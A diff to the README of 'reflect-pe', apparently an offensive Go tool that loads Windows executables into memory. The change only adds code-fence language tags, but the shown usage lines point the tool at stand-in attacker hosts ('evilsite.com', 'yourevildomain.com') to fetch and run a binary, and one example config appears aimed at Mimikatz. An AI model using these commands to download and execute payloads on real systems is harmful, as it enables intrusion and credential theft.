@@ -12,20 +12,20 @@ Finally, it produces a self-contained executable so no ugly command lines to be 
 2. Prepare your `config.yml` file (see below)
 
 3. Build the executable
-```
+```bat
 git clone https://github.com/ayoul3/reflect-pe
 cd reflect-pe
 go build -v .
 ```
 Run it and enjoy
-```
+```bat
 reflect-pe.exe
 reflect-pe.exe config_mimi.yml
 reflect-pe.exe http://www.evilsite.com/config.yml
 ```
 
 ## Config
-```
+```yaml
 # BinaryPath can either be an HTTP url, a relative path or an absolute path.
 BinaryPath: 'http://www.yourevildomain.com/file.exe'
 
